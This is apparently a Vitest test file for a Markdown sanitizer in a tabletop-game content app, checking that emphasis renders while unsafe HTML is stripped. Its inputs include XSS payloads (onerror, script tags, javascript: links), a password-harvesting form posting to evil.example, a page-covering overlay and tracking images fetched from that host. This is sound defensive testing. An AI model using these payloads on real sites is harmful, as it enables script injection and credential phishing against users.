/*
 * The prose seam. Content is user-owned CSV, so it may carry Markdown AND raw HTML AND an injection
 * attempt in the same cell — these assert that emphasis survives and script does not, on both the
 * block renderer (article body) and the inline one (a spell's "at higher levels" / material line).
 */
import { describe, it, expect } from 'vitest';
import { renderContentMarkdown, renderContentMarkdownInline } from './markdown';

describe('renderContentMarkdown', () => {
	it('renders both emphasis spellings', () => {
		expect(renderContentMarkdown('_Magic Missile_')).toContain('<em>Magic Missile</em>');
		expect(renderContentMarkdown('*Magic Missile*')).toContain('<em>Magic Missile</em>');
		expect(renderContentMarkdown('**Ghouls**')).toContain('<strong>Ghouls</strong>');
	});

	it('leaves an underscore inside a word alone', () => {
		expect(renderContentMarkdown('hit_die and spell_slot')).toContain('hit_die and spell_slot');
	});

	it('strips anything executable', () => {
		const html = renderContentMarkdown('<img src=x onerror="alert(1)"><script>alert(2)</script>ok');
		expect(html).not.toContain('onerror');
		expect(html).not.toContain('<script');
	});

	// Nothing here runs, and all of it deceives: a form posts what the reader types to a stranger, and
	// a style can draw over the app's own dialogs. DOMPurify's defaults keep every one of them.
	it('strips markup that deceives without executing', () => {
		const html = renderContentMarkdown(
			'<form action="https://evil.example"><input type="password"><button>Sync</button></form>' +
				'<style>body{display:none}</style>' +
				'<div style="position:fixed;inset:0">over</div>',
		);
		for (const gone of ['<form', '<input', '<button', '<style', 'style='])
			expect(html).not.toContain(gone);
		expect(html).toContain('over');
	});

	// A source prose names is fetched the moment the row is read. Only what travels with the page is
	// let through; a link is not a fetch and keeps its address.
	it('loads only what travels with the page, and leaves a link its address', () => {
		const html = renderContentMarkdown(
			'<img alt="remote" src="https://evil.example/pixel.png">' +
				'<img alt="inline" src="data:image/png;base64,iVBORw0KGgo=">' +
				'<img alt="own" src="/content/portrait.png">' +
				'<img alt="set" srcset="https://evil.example/2x.png 2x">' +
				'<svg><image href="https://evil.example/in.svg" /></svg>' +
				'<a href="https://example.com/rules">rules</a>',
		);
		expect(html).not.toContain('evil.example');
		expect(html).toContain('alt="remote"');
		expect(html).toContain('src="data:image/png;base64,iVBORw0KGgo="');
		expect(html).toContain('src="/content/portrait.png"');
		expect(html).toContain('href="https://example.com/rules"');
	});

	it('drops data attributes and every class but the renderer’s own', () => {
		const html = renderContentMarkdown(
			'<p class="dialog-shell prose-break danger" data-action="delete">text</p>' +
				'<table><tr class="heading"><td>a</td></tr></table>',
		);
		expect(html).not.toContain('data-action');
		expect(html).not.toContain('dialog-shell');
		expect(html).not.toContain('heading');
		expect(html).toContain('class="prose-break"');
		expect(html).toContain('class="prose-table-scroll"');
	});

	it('keeps the classes the renderer adds itself', () => {
		expect(renderContentMarkdown('<table><tr><td>a</td></tr></table>')).toContain(
			'class="prose-table-scroll"',
		);
	});
});

describe('renderContentMarkdownInline', () => {
	// The bug this exists for: both of these cells were interpolated as plain text, so every spell
	// that used emphasis outside its body printed the syntax verbatim.
	it('renders emphasis that used to show literally', () => {
		expect(renderContentMarkdownInline('animate four **Ghouls**')).toContain(
			'<strong>Ghouls</strong>',
		);
		expect(renderContentMarkdownInline('as _Magic Missile_')).toContain('<em>Magic Missile</em>');
	});

	it('holds the inline fragment to the same policy as the article body', () => {
		const html = renderContentMarkdownInline(
			'a pinch of <form action="https://evil.example"><input></form>' +
				'<b style="position:fixed" class="danger" data-x="1">salt</b>' +
				'<img src="https://evil.example/p.png">',
		);
		for (const gone of ['<form', '<input', 'style=', 'class=', 'data-x', 'evil.example'])
			expect(html).not.toContain(gone);
		expect(html).toContain('<b>salt</b>');
	});

	it('stays inline — a one-line callout gets no block wrapper', () => {
		expect(renderContentMarkdownInline('a pinch of salt')).toBe('a pinch of salt');
	});

	it('strips anything executable', () => {
		expect(renderContentMarkdownInline('<a href="javascript:alert(1)">x</a>')).not.toContain(
			'javascript:',
		);
	});
});
